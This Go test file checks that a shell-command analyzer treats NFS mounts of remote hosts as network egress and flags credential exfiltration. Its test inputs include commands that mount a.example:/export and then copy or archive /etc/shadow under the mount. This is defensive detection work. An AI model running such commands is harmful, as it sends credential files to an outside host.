package analysis

// Regression tests for Finding 99 (pass 63, second lens): the NFS/scp remote
// spelling `[user@]host:/path` names an authority, so mounting it is a network
// effect and a credential copied under the mount point forms a pair.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding099NFSMountIsRemote pins F99: the NFS/scp remote spelling
// `[user@]host:/path` names an authority, so mounting it reports the network
// effect and a credential copied under the mount point forms a pair.
func TestFinding099NFSMountIsRemote(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`mount -t nfs a.example:/export /mnt`,
		`mount a.example:/export /mnt`,
		`mount -t nfs4 a.example:/export /mnt`,
		`mount -t nfs user@a.example:/e /mnt`,
	} {
		rep := a.Analyze(LangBash, src)
		if !effectOn(rep, engine.KindNetEgress, "a.example") {
			t.Errorf("%q: NFS source reported no network destination (effects=%v)", src, rep.Effects)
		}
	}
	for _, src := range []string{
		`mount -t nfs a.example:/export /mnt; cp /etc/shadow /mnt/x`,
		`mount -t nfs a.example:/export /mnt && tar czf /mnt/x.tgz /etc/shadow`,
	} {
		rep := a.Analyze(LangBash, src)
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: credential copied under an NFS mount formed no pair (score=%+v)", src, rep.Score)
		}
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}
}

// TestFinding099MountPrecision pins the precision side: a block-device mount, a
// single-label authority, a filename containing a colon and a loopback export
// fabricate no network effect.
func TestFinding099MountPrecision(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`mount -t ext4 /dev/sda1 /mnt`,
		`mount /dev/sda1 /mnt`,
		`mount -t nfs localhost:/e /mnt`,
		`cp a b:/x`,
		`echo hi > foo.txt:bar`,
		`echo hi > dir:name/x`,
	} {
		if rep := a.Analyze(LangBash, src); hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: fabricated a network effect (effects=%v)", src, rep.Effects)
		}
	}
}
